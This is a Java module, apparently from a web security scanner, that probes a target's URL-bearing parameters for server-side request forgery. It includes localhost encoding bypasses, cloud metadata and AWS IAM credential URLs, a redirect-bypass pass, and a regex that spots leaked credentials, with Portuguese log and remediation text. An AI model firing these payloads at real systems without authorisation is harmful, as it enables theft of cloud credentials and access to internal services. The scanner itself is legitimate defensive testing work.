package gg.effront.anarcry.scanner.web.ssrf;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SsrfModule implements Scanner {

    // Common URL-bearing parameters
    private static final List<String> URL_PARAMS = List.of("url", "uri", "link", "src", "source", "fetch", "path",
            "proxy", "redirect", "resource", "dest", "target", "page", "html", "load", "document", "webhook_url",
            "callback_url", "ping_url", "imageUrl", "avatarUrl", "import_url", "icon_url", "logo_url");

    // Paths commonly associated with URL-fetching functionality
    private static final List<String> PROBE_PATHS = List.of("/", "/api/", "/api/v1/", "/api/fetch", "/api/proxy",
            "/api/url", "/fetch", "/proxy", "/webhook", "/notification", "/api/webhook", "/api/v1/webhook",
            "/api/v1/notification");

    private record SsrfProbe(String url, String label, Severity severity) {
    }

    // localhost + cloud metadata endpoints from Payloads4All SSRF README
    private static final List<SsrfProbe> SSRF_PROBES = List.of(
            // Standard forms
            new SsrfProbe("http://127.0.0.1/", "localhost", Severity.HIGH),
            new SsrfProbe("http://localhost/", "localhost", Severity.HIGH),
            new SsrfProbe("http://0.0.0.0/", "localhost", Severity.HIGH),
            // IP encoding bypasses
            new SsrfProbe("http://2130706433/", "localhost-decimal", Severity.HIGH),
            new SsrfProbe("http://0x7f000001/", "localhost-hex", Severity.HIGH),
            new SsrfProbe("http://[::1]/", "localhost-IPv6", Severity.HIGH),
            new SsrfProbe("http://[::ffff:127.0.0.1]/", "localhost-IPv6map", Severity.HIGH),
            new SsrfProbe("http://127.1/", "localhost-short", Severity.HIGH),
            new SsrfProbe("http://017700000001/", "localhost-octal", Severity.HIGH),
            new SsrfProbe("http://0177.00.00.01/", "localhost-octaldot", Severity.HIGH),
            // Cloud metadata
            new SsrfProbe("http://169.254.169.254/latest/meta-data/", "AWS metadata", Severity.CRITICAL),
            new SsrfProbe("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM",
                    Severity.CRITICAL),
            new SsrfProbe("http://169.254.169.254/metadata/instance", "Azure metadata", Severity.CRITICAL),
            new SsrfProbe("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", Severity.CRITICAL));

    // Patterns in response body that prove the server actually fetched the target
    // URL.
    // Deliberately excludes the probe IP (169.254.169.254) — that string can appear
    // in the
    // body simply because Next.js / React SSR reflects query-string params in
    // __NEXT_DATA__,
    // which is a false positive, not evidence of server-side fetch.
    private static final Pattern METADATA_PATTERN = Pattern
            .compile("(?i)(ami-id|instance-id|security-credentials|secretAccessKey|accessKeyId"
                    + "|computeMetadata|instanceMetadata" + "|root:x:|/etc/passwd|Welcome to nginx|<title>Apache)");

    @Override
    public String id() {
        return "SSRF";
    }

    // Redirect bypass only tests the most distinctive probes to avoid re-running
    // all 4k+ combos
    private static final List<SsrfProbe> REDIRECT_PROBES = List.of(
            new SsrfProbe("http://169.254.169.254/latest/meta-data/", "AWS metadata", Severity.CRITICAL),
            new SsrfProbe("http://169.254.169.254/metadata/instance", "Azure metadata", Severity.CRITICAL),
            new SsrfProbe("http://127.0.0.1/", "localhost", Severity.HIGH));

    // High-signal params checked first in redirect bypass
    private static final List<String> REDIRECT_PARAMS = List.of("url", "redirect", "proxy", "fetch", "src",
            "webhook_url", "callback_url");

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        List<Finding> findings = new ArrayList<>();

        String _cweId = CweRegistry.cweId(id());
        String _cweTitle = CweRegistry.cweTitle(id());
        String _cveVector = CweRegistry.cvssVector(id());
        double _score = CvssCalculator.calculate(_cveVector);

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String baseUrl = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        HttpClient hc = HttpClientFactory.noRedirect();
        HttpClient hcFollow = HttpClientFactory.followOne();

        // Filter to only paths that exist (avoid 404 noise × 14 probes × 24 params)
        List<String> activePaths = new ArrayList<>();
        log.accept("[~] SSRF: verificando " + PROBE_PATHS.size() + " paths em " + baseUrl);
        for (String path : PROBE_PATHS) {
            try {
                HttpRequest baseline = HttpRequest.newBuilder().uri(URI.create(baseUrl + path))
                        .timeout(Duration.ofSeconds(4)).GET().build();
                int status = Http.send(ctx, hc, baseline, HttpResponse.BodyHandlers.discarding(), id()).statusCode();
                if (status != 404 && status != 410) {
                    activePaths.add(path);
                }
            } catch (Exception e) {
                // Unreachable path — skip
            }
        }

        if (activePaths.isEmpty()) {
            log.accept("[+] SSRF: nenhum path acessível encontrado");
            return findings;
        }
        log.accept("[~] SSRF: " + activePaths.size() + "/" + PROBE_PATHS.size() + " paths ativos — iniciando "
                + (activePaths.size() * URL_PARAMS.size() * SSRF_PROBES.size()) + " probes");

        outer : for (int pi = 0; pi < activePaths.size(); pi++) {
            String path = activePaths.get(pi);
            log.accept("[~] SSRF: [" + (pi + 1) + "/" + activePaths.size() + "] " + path + " — " + URL_PARAMS.size()
                    + " params × " + SSRF_PROBES.size() + " probes");
            for (String param : URL_PARAMS) {
                for (SsrfProbe probe : SSRF_PROBES) {
                    try {
                        String encoded = URLEncoder.encode(probe.url(), "UTF-8");
                        String url = baseUrl + path + "?" + param + "=" + encoded;
                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(5))
                                .GET().build();
                        HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
                        String body = resp.body() != null ? resp.body() : "";

                        String trimmed = body.stripLeading();
                        boolean isHtml = trimmed.startsWith("<!DOCTYPE") || trimmed.startsWith("<html")
                                || trimmed.startsWith("<!doctype");
                        if (resp.statusCode() == 200 && !body.isBlank() && !isHtml) {
                            Matcher m = METADATA_PATTERN.matcher(body);
                            if (m.find()) {
                                String match = m.group();
                                log.accept("[!!] SSRF: " + probe.severity() + " — " + probe.label()
                                        + " acessível via param=" + param + " path=" + path);
                                findings.add(Finding.of("SSRF", path + "?" + param,
                                        "SSRF — servidor acessa " + probe.label() + " (param: " + param + ")",
                                        probe.severity(),
                                        "URL: " + url + " | Indicador: " + match + " | Body (200 chars): "
                                                + body.substring(0, Math.min(200, body.length())),
                                        "Servidor faz requisição para " + probe.url()
                                                + " e retorna o conteúdo na resposta HTTP — "
                                                + "atacante pode acessar serviços internos, "
                                                + "credenciais de cloud e metadados de instância",
                                        "curl '" + url + "'",
                                        "Bloquear ranges RFC1918 e link-local (169.254.x.x) na camada de rede; "
                                                + "usar allowlist de hosts externos; validar e resolver DNS antes de"
                                                + "conectar",
                                        _cweId, _cweTitle, _cveVector, _score));
                                break outer;
                            }
                        }
                    } catch (Exception e) {
                        // Connection errors and URI issues are expected — skip
                    }
                }
            }
        }

        // Redirect bypass: only top params × critical probes (not the full 4k+ combo)
        if (findings.isEmpty()) {
            log.accept("[~] SSRF: testando redirect bypass (" + activePaths.size() + " paths × "
                    + REDIRECT_PARAMS.size() + " params × " + REDIRECT_PROBES.size() + " probes)...");
            redirectOuter : for (String path : activePaths) {
                for (String param : REDIRECT_PARAMS) {
                    for (SsrfProbe probe : REDIRECT_PROBES) {
                        try {
                            String encoded = URLEncoder.encode(probe.url(), "UTF-8");
                            String url = baseUrl + path + "?" + param + "=" + encoded;
                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url))
                                    .timeout(Duration.ofSeconds(6)).GET().build();
                            HttpResponse<String> resp = Http.send(ctx, hcFollow, req,
                                    HttpResponse.BodyHandlers.ofString(), id());
                            String body = resp.body() != null ? resp.body() : "";
                            Matcher m = METADATA_PATTERN.matcher(body);
                            if (resp.statusCode() == 200 && m.find()) {
                                String match = m.group();
                                log.accept("[!!] SSRF: via redirect — " + probe.label() + " param=" + param);
                                findings.add(Finding.of("SSRF", path + "?" + param,
                                        "SSRF via redirect bypass — " + probe.label() + " (param: " + param + ")",
                                        probe.severity(), "URL: " + url + " | Via redirect | Indicador: " + match,
                                        "Servidor segue redirect para " + probe.url() + " — bypass via 301",
                                        "curl -L '" + url + "'",
                                        "Validar URL final após resolução de redirects; bloquear ranges internos mesmo"
                                                + "via redirect",
                                        _cweId, _cweTitle, _cveVector, _score));
                                break redirectOuter;
                            }
                        } catch (Exception e) {
                            // expected
                        }
                    }
                }
            }
        }

        if (findings.isEmpty()) {
            log.accept("[+] SSRF: nenhum indicador de SSRF detectado");
        }
        return findings;
    }

}
